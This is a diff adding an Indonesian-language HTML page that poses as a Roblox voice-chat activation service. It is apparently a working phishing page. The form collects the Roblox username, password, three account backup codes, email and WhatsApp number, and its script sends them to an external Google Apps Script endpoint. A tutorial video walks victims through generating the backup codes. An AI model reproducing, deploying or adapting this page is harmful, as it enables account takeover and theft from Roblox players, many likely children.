@@ -1,0 +1,367 @@
+  <!DOCTYPE html>
+  <html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Aktivasi Voice Chat Roblox - VoiceBlox.id</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+      :root{
+        --bg-grad: linear-gradient(135deg,#1f1c2c,#928dab);
+        --card-bg: #ffffff;
+        --muted: #6b6b6b;
+        --accent: #ffcc00;
+        --success: #06c258;
+        --error: #e63946;
+        --radius: 14px;
+        --shadow: 0 8px 30px rgba(0,0,0,0.28);
+      }
+
+      *{box-sizing:border-box}
+      body{
+        margin:0;
+        font-family: 'Poppins', sans-serif;
+        background: var(--bg-grad);
+        min-height:100vh;
+        display:flex;
+        align-items:center;
+        justify-content:center;
+        padding:28px;
+        color:#111;
+      }
+
+      .card{
+        width:100%;
+        max-width:760px;
+        background:var(--card-bg);
+        border-radius:var(--radius);
+        box-shadow:var(--shadow);
+        padding:28px;
+        overflow:hidden;
+        animation:cardIn .5s ease;
+      }
+
+      @keyframes cardIn{
+        from{opacity:0; transform:translateY(12px)}
+        to{opacity:1; transform:translateY(0)}
+      }
+
+      .grid{
+        display:grid;
+        grid-template-columns: 1fr 380px;
+        gap:28px;
+      }
+
+      /* responsive */
+      @media (max-width:880px){
+        .grid{grid-template-columns:1fr; padding-bottom:0}
+      }
+
+      header h1{
+        margin:0 0 6px 0;
+        color:var(--accent);
+        font-size:1.25rem;
+        letter-spacing:.2px;
+      }
+      header p.lead{
+        margin:0 0 18px 0;
+        color:var(--muted);
+        font-size:0.95rem;
+      }
+
+      form{
+        display:flex;
+        flex-direction:column;
+      }
+
+      .field{
+        margin-bottom:12px;
+      }
+
+      label{
+        display:block;
+        font-weight:600;
+        font-size:0.85rem;
+        margin-bottom:6px;
+        color:#222;
+      }
+
+      .sr-only{
+        position: absolute !important;
+        height: 1px; width: 1px;
+        overflow: hidden;
+        clip: rect(1px,1px,1px,1px);
+        white-space: nowrap;
+      }
+
+      input[type="text"],
+      input[type="password"],
+      input[type="email"]{
+        width:100%;
+        padding:12px 14px;
+        border-radius:10px;
+        border:1px solid #e6e6e6;
+        background:#fbfbfb;
+        font-size:0.98rem;
+        color:#222;
+        transition:box-shadow .18s, border-color .18s;
+      }
+
+      input::placeholder{ color:#9a9a9a }
+
+      input:focus{
+        outline:none;
+        border-color:var(--accent);
+        box-shadow:0 6px 18px rgba(255,204,0,0.12);
+      }
+
+      .muted{
+        font-size:0.85rem;
+        color:var(--muted);
+      }
+
+      .actions{
+        margin-top:12px;
+      }
+
+      button.submit{
+        width:100%;
+        padding:12px 14px;
+        border-radius:10px;
+        border:none;
+        background:var(--accent);
+        color:#000;
+        font-weight:700;
+        cursor:pointer;
+        font-size:1rem;
+        transition:transform .12s ease, box-shadow .12s;
+      }
+
+      button.submit:disabled{
+        opacity:.7;
+        cursor:not-allowed;
+        transform:none;
+        box-shadow:none;
+      }
+
+      button.submit:not(:disabled):hover{
+        transform:translateY(-3px);
+        box-shadow:0 8px 20px rgba(0,0,0,0.12);
+      }
+
+      #status{
+        margin-top:14px;
+        min-height:28px;
+        font-weight:600;
+        text-align:left;
+        font-size:0.95rem;
+      }
+      #status .ok{ color:var(--success) }
+      #status .err{ color:var(--error) }
+
+      /* right column: video & notes */
+      .side{
+        display:flex;
+        flex-direction:column;
+        gap:18px;
+      }
+
+      .video-wrap{
+        width:100%;
+        background:#000;
+        border-radius:10px;
+        overflow:hidden;
+        box-shadow:0 6px 18px rgba(0,0,0,0.12);
+      }
+
+      .video-wrap .embed{
+        position:relative;
+        padding-top:56.25%;
+        height:0;
+      }
+      .video-wrap iframe{
+        position:absolute;
+        top:0; left:0; width:100%; height:100%;
+        border:0;
+        display:block;
+      }
+
+      .note{
+        background:#fff6d9;
+        border-radius:10px;
+        padding:12px;
+        font-size:0.95rem;
+        color:#423600;
+        border:1px solid rgba(0,0,0,0.04);
+      }
+
+      footer.small{
+        margin-top:16px;
+        text-align:center;
+        color:var(--muted);
+        font-size:0.85rem;
+      }
+    </style>
+  </head>
+  <body>
+    <main class="card" role="main">
+      <div class="grid">
+        <section>
+          <header>
+            <h1>Form Aktivasi Voice Chat Roblox</h1>
+            <p class="lead">Isi data dengan benar. Kami hanya membutuhkan informasi ini untuk aktivasi voice chat dan notifikasi pesanan.</p>
+          </header>
+
+          <form id="voiceForm" novalidate>
+            <!-- Username -->
+            <div class="field">
+              <label for="username">Username Roblox</label>
+              <input id="username" name="username" type="text" autocomplete="username" placeholder="masukan username" required>
+            </div>
+
+            <!-- Password -->
+            <div class="field">
+              <label for="password">Password Roblox</label>
+              <input id="password" name="password" type="password" autocomplete="new-password" placeholder="Masukkan password" required>
+            </div>
+
+            <!-- Kode backup -->
+            <div class="field">
+              <label for="kode1">Kode backup 1</label>
+              <input id="kode1" name="kode1" type="text" placeholder="Kode 1" required>
+            </div>
+
+            <div class="field">
+              <label for="kode2">Kode backup 2</label>
+              <input id="kode2" name="kode2" type="text" placeholder="Kode 2" required>
+            </div>
+
+            <div class="field">
+              <label for="kode3">Kode backup 3</label>
+              <input id="kode3" name="kode3" type="text" placeholder="Kode 3" required>
+            </div>
+
+            <!-- Email -->
+            <div class="field">
+              <label for="email">Email aktif</label>
+              <input id="email" name="email" type="email" autocomplete="email" placeholder="nama@email.com" required>
+            </div>
+
+            <!-- WA -->
+            <div class="field">
+              <label for="wa">Nomor WhatsApp</label>
+              <input id="wa" name="wa" type="text" autocomplete="tel" placeholder="0812xxxxxxx" required>
+            </div>
+
+            <div class="actions">
+              <button type="submit" class="submit" id="submitBtn">Kirim Data Aktivasi</button>
+            </div>
+
+            <div id="status" role="status" aria-live="polite"></div>
+          </form>
+
+          <footer class="small">Anda akan diarahkan ke halaman <strong>cekstatus</strong> jika pengiriman berhasil.</footer>
+        </section>
+
+        <aside class="side" aria-label="Tutorial dan catatan">
+  <div style="text-align:center; margin: 30px;">
+    <h3 style="font-family: 'Poppins', sans-serif;">Cara Membuat Kode Backup Roblox</h3>
+
+    <!-- VIDEO POTRAIT (9:16) -->
+    <div style="position: relative; padding-bottom: 177.78%; height: 0; overflow: hidden; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.2); background:#000;">
+      <video 
+        src="cara membuat kode backup.mp4"
+        controls 
+        preload="metadata"
+        style="position: absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; border-radius:12px;"
+        poster="poster.jpg">
+        Browser kamu tidak mendukung pemutaran video.
+      </video>
+    </div>
+  </div>      
+
+  <div class="note" aria-hidden="false">
+    <strong>Catatan penting:</strong>
+    <ul style="margin:8px 0 0 18px; padding:0; color:#423600">
+      <li>Pastikan email dan WA aktif supaya kami dapat menghubungi.</li>
+      <li>Disarankan ubah password setelah aktivasi selesai.</li>
+      <li>Data akan digunakan hanya untuk proses aktivasi dan notifikasi.</li>
+    </ul>
+  </div>
+</aside>
+
+    <script>
+      // Ganti scriptURL dengan Web App Google Apps Script mu
+      const scriptURL = "https://script.google.com/macros/s/AKfycbw0KuJytTWvX5GfMiINTSfX2wp883YZdK9DIohx9psJLzD2HkorSXy66bO_4l8aAFzr/exec";
+
+      const form = document.getElementById('voiceForm');
+      const statusDiv = document.getElementById('status');
+      const submitBtn = document.getElementById('submitBtn');
+
+      function setStatus(message, type = '') {
+        // type: '', 'ok', 'err'
+        statusDiv.innerHTML = '';
+        if (!message) return;
+        const span = document.createElement('span');
+        span.textContent = message;
+        if (type === 'ok') span.className = 'ok';
+        if (type === 'err') span.className = 'err';
+        statusDiv.appendChild(span);
+      }
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        // simple client-side validity check
+        if (!form.checkValidity()) {
+          form.reportValidity();
+          return;
+        }
+
+        setStatus('🔄 Mengirim data...', '');
+        submitBtn.disabled = true;
+
+        try {
+          const resp = await fetch(scriptURL, {
+            method: 'POST',
+            body: new FormData(form),
+            mode: 'cors',
+          });
+
+          // handle non-200
+          if (!resp.ok) {
+            const txt = await resp.text().catch(()=> '');
+            throw new Error(`Server error (${resp.status}) ${txt ? '- ' + txt : ''}`);
+          }
+
+          // attempt to parse JSON; if fails, fallback to text
+          const text = await resp.text();
+          let data = null;
+          try { data = JSON.parse(text); } catch(e){ /* not JSON */ }
+
+          // If backend returns structured success, follow it
+          if (data && (data.success === true || data.status === 'ok')) {
+            setStatus('✅ Data berhasil dikirim! Mengarahkan ke halaman cek status...', 'ok');
+            // if backend provides redirect url, use it; otherwise use lokal cekstatus.html
+            const redirect = data.url || data.redirect || 'cekstatus.html';
+            setTimeout(() => { window.location.href = redirect; }, 1200);
+          } else {
+            // if backend returns message field, show it; otherwise generic success behavior
+            if (data && (data.error || data.message)) {
+              throw new Error(data.error || data.message);
+            } else {
+              // no JSON but server responded OK -> assume success and redirect
+              setStatus('✅ Data berhasil dikirim! Mengarahkan ke halaman pembayaran...', 'ok');
+              setTimeout(() => { window.location.href = 'cekstatus.html'; }, 1200);
+            }
+          }
+        } catch (err) {
+          console.error(err);
+          setStatus('❌ Terjadi kesalahan: ' + (err.message || 'Silakan coba lagi nanti.'), 'err');
+        } finally {
+          submitBtn.disabled = false;
+        }
+      });
+    </script>
+  </body>
+  </html>
